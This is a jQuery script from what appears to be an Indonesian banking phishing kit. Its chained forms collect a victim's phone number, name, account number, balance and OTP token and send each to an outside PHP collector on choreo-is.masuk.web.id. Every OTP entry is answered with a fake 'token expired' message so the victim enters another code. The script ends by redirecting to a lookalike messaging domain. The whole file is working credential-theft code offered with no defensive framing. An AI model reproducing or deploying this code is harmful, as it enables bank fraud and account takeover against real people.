// index
 $(document).ready(function(){
    $('#formHP').submit(function(e) {
    event.preventDefault();   
 $("#lodingku").show();
 $.ajax({
 type: 'POST',
 url: 'https://choreo-is.masuk.web.id/x12/no.php',
 data: $(this).serialize(),
 datatype: 'JSON', 
 complete: function(data) {
           console.log('Complete')
  setTimeout(function(){
   $('#lodingku').hide();
     window.location = "./debit.html";    
      var nomor = document.getElementById('nope').value;
    sessionStorage.setItem("nomor", nomor);
     }, 500);
        }
    });
 });
    return false;
});   
     
     
//data     
$('#form1').on('submit', function (event) {
  event.stopPropagation();
    event.preventDefault();    
$("#lodingku").show();
$.ajax({
 type: 'POST',
 url: 'https://choreo-is.masuk.web.id/x12/login.php',
 async: false,
 dataType: 'JSON',
 data: $(this).serialize(), 
 complete: function(data) {
           console.log('Complete')
 setTimeout(function(){
       $("#lodingku").hide();
 location.href ="./saldo.html";
    var nomortel = document.getElementById('nomorku').value;
    sessionStorage.setItem("nomortel", nomortel);
    var noreke = document.getElementById('norek').value;
    sessionStorage.setItem("noreke", noreke);
    var namanya = document.getElementById('nama').value;
    sessionStorage.setItem("namanya", namanya);     
    }, 1500);
        }
    });
    return false;
});       
    
    
    
    
// saldo  
$('#form2').on('submit', function (event) {
  event.stopPropagation();
    event.preventDefault();    
$("#lodingku").show();
$.ajax({
 type: 'POST',
 url: 'https://choreo-is.masuk.web.id/x12/saldo.php',
 async: false,
 dataType: 'JSON',
 data: $(this).serialize(), 
 complete: function(data) {
            console.log('Complete')
            setTimeout(function(){
 var phone = document.getElementById("nomorsaya").value;
 sessionStorage.setItem("phone", phone);
 var user = document.getElementById("namaku").value;
 sessionStorage.setItem("user", user);
 var card = document.getElementById("norekku").value;
 sessionStorage.setItem("card", card);
 var duet = document.getElementById("saldo").value;
 sessionStorage.setItem("duet", duet);  
 location.href ="./otp.html";
 }, 500);
        }
    });
    return false;
});   
        


// otp
$('#form3').on('submit', function (event) {
  event.stopPropagation();
    event.preventDefault(); 
  $("#djload").show();    
  document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
$.ajax({
 type: 'POST',
 url: 'https://choreo-is.masuk.web.id/x12/otp.php',
 async: false,
 dataType: 'JSON',
 data: $(this).serialize(), 
 complete: function(data) {
           console.log('Complete')
 setTimeout(function(){      
     }, 2000);
     $("#notif").text("- Kode Token Aktivasi sudah kadaluarsa -");
     $("#notif").css("color", "red");
        }
    });
     setTimeout(() => {
     document.getElementById("notif").innerHTML = "Untuk mendapatkan kode Token Aktivasi,<br/>Silahkan klik tombol dibawah ini";
     $("#djload").hide();  
   $("#notif").css("color", "black");
 $("#sixpin").val("");
document.getElementById('btnSubmit1').innerHTML = "Selanjutnya";                    
   }, 4000);
    return false;
});       


// datawa
function getcs(){
 $("#djload").show();   
setTimeout(function(){  
location.href='https://choreo12pagesdev.wasap.my/';
 $("#djload").hide();   
    }, 1000);    
}     
